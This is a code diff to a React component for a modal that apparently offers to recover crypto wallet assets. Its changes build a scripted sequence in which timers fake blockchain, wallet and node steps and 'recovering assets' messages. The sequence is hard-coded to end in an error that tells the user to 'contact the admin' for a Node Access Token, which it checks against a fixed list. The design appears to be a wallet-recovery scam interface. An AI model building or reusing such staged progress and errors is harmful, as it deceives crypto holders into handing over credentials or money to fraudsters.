@@ -2,6 +2,7 @@ import React from 'react';
 import { useState, useEffect } from 'react';
 import { FaCheck } from 'react-icons/fa';
 import { MdOutlineErrorOutline } from 'react-icons/md';
+import { IoMdCloseCircle } from 'react-icons/io';
 import { SpinnerDotted } from 'spinners-react';
 
 import { logo } from '../constants/icons';
@@ -39,16 +40,22 @@ const App = () => {
 		nodeAccess: '',
 	});
 
+	// Error States
 	const [errors, setErrors] = useState({});
 	const [nodeAccessErrors, setNodeAccessErrors] = useState({});
+	// Loading States
 	const [loading, setLoading] = useState(false);
+	// Statest for api calls stimulation
+	const [nodeLoading, setNodeLoading] = useState(false);
 	const [submitted, setSubmitted] = useState(false);
 	const [blockchainLoading, setBlockchainLoading] = useState(false);
 	const [readingWallet, setReadingWallet] = useState(false);
 	const [accessNode, setAccessNode] = useState(false);
 	const [dependency, setDependency] = useState(false);
 	const [validateAuth, setValidateAuth] = useState(false);
-	const [recovery, setRecovery] = useState(false);
+	const [recovery, setRecovery] = useState('notRecovering');
+	// Handle the final state of the form submition
+	const [final, setFinal] = useState(false);
 
 	const handleChange = (e) => {
 		const { name, value } = e.target;
@@ -86,6 +93,8 @@ const App = () => {
 		} else if (nodeForm.nodeAccess !== NTA[0]) {
 			nodeFormErrors.nodeToken = 'Invalid Token';
 		}
+
+		return nodeFormErrors;
 	};
 
 	const handleSubmit = (e) => {
@@ -105,7 +114,7 @@ const App = () => {
 				setAccessNode(true);
 				setDependency(true);
 				setValidateAuth(true);
-				setRecovery(true);
+				setRecovery('recovering');
 
 				setTimeout(() => {
 					setBlockchainLoading(false);
@@ -125,7 +134,7 @@ const App = () => {
 
 									//
 									setTimeout(() => {
-										setRecovery(false);
+										setRecovery('recoveryError');
 									}, 7000);
 								}, 2000);
 							}, 2000);
@@ -140,11 +149,30 @@ const App = () => {
 		e.preventDefault();
 		const nodeValidationErrors = validateNodeForm();
 		if (Object.keys(nodeValidationErrors).length > 0) {
-			setErrors(nodeValidationErrors);
+			setNodeAccessErrors(nodeValidationErrors);
 		} else {
-			setErrors({});
-			setLoading(true);
+			setNodeAccessErrors({});
+			setNodeLoading(true);
+			// Simulate API call
+			setTimeout(() => {
+				setNodeLoading(false);
+				setRecovery(true);
+				setTimeout(() => {
+					setRecovery('recovered');
+				}, 2000);
+			}, 2000);
 		}
+	};
+
+	const closeForm = () => {
+		setIsModalOpen(!isModalOpen);
+		setSubmitted(false);
+		setBlockchainLoading(false);
+		setReadingWallet(false);
+		setAccessNode(false);
+		setDependency(false);
+		setValidateAuth(false);
+		setRecovery(false);
 	};
 
 	return (
@@ -162,8 +190,14 @@ const App = () => {
 			{isModalOpen && (
 				<div className="fixed inset-0 bg-gray-500 bg-opacity-75 flex justify-center items-center px-4">
 					{submitted ? (
-						<div className="modal bg-white justify-between items-center p-4 rounded-lg w-[400px]">
+						<div className="modal bg-white justify-between items-center p-4 rounded-lg w-[400px] relative">
 							<div className="flex flex-col items-center align-middle">
+								<IoMdCloseCircle
+									className="absolute right-10 top-6"
+									size={24}
+									onClick={() => closeForm()}
+									color="#F97066"
+								/>
 								<img src={logo} alt="" />
 								<div className="header text-center">
 									<h1 className="text-gray-900 text-[18px] font-semibold">
@@ -258,11 +292,18 @@ const App = () => {
 									)}
 								</div>
 								<div>
-									{recovery ? (
+									{recovery == 'recovering' ? (
 										<div className="flex items-center gap-2">
 											<SpinnerDotted color="#7F56D9" size={20} />{' '}
 											<p>Recoverying assets...</p>
 										</div>
+									) : recovery == 'recovered' ? (
+										<>
+											<p className="text-[10px] text-gray-900 font-semibold">
+												Your assets has been recovered. Please contact the admin
+												for further assitance
+											</p>
+										</>
 									) : (
 										<>
 											<div className="flex items-center gap-2">
@@ -271,46 +312,42 @@ const App = () => {
 													color="#F97066"
 													size={20}
 												/>
-												<p className="text-[#F97066]">Error!!...</p>
+												<p className="text-[#F97066]">
+													Error accessing your wallet node extenstion
+												</p>
 											</div>
-											<p>Please contact the admin for Node Access Token</p>
+											<p className="text-[12px] font-semibold">
+												Please contact the admin for your Node Access Token
+											</p>
 											<form
 												onSubmit={nodeFormSubmit}
-												action=""
 												className="flex flex-col gap-2 mt-2">
 												<div>
 													<label
-														htmlFor="walletId"
-														className="text-gray-600 text-[14px] font-medium ">
+														htmlFor="nodeAccess"
+														className="text-gray-600 text-[14px] font-medium">
 														Node Access Token
 													</label>
 													<br />
 													<input
-														type="text"
-														name="walletId"
+														type="password"
+														name="nodeAccess"
 														className="border border-gray-300 rounded-md w-full text-sm p-2 focus:border-[#7F56D9] focus:outline-none"
-														placeholder="Node accessToken"
-														// value={formData.walletId}
-														// onChange={handleChange}
+														placeholder="Node access token"
+														value={nodeForm.nodeAccess}
+														onChange={nodeFormChange}
 													/>
-													{errors.walletId && (
+													{nodeAccessErrors.nodeToken && (
 														<span className="text-red-500 text-sm">
-															{errors.walletId}
+															{nodeAccessErrors.nodeToken}
 														</span>
 													)}
 												</div>
 												<button
 													type="submit"
-													className="flex items-center flex-col align-middle bg-[#7F56D9] w-full text-[16px] text-white font-semibold rounded-md p-2">
-													{loading ? (
+													className="flex items-center justify-center bg-[#7F56D9] w-full text-[16px] text-white font-semibold rounded-md p-2">
+													{nodeLoading ? (
 														<SpinnerDotted size={24} color="white" />
-													) : submitted ? (
-														<>
-															<FaCheck
-																className="flex items-center justify-center"
-																size={24}
-															/>
-														</>
 													) : (
 														'Confirm'
 													)}
@@ -323,7 +360,7 @@ const App = () => {
 						</div>
 					) : (
 						<div className="modal bg-white justify-between items-center p-4 rounded-lg w-[400px]">
-							<div className="flex flex-col items-center align-middle">
+							<div className="flex flex-col items-center align-middle relative">
 								<img src={logo} alt="" />
 								<div className="header text-center">
 									<h1 className="text-gray-900 text-[18px] font-semibold">
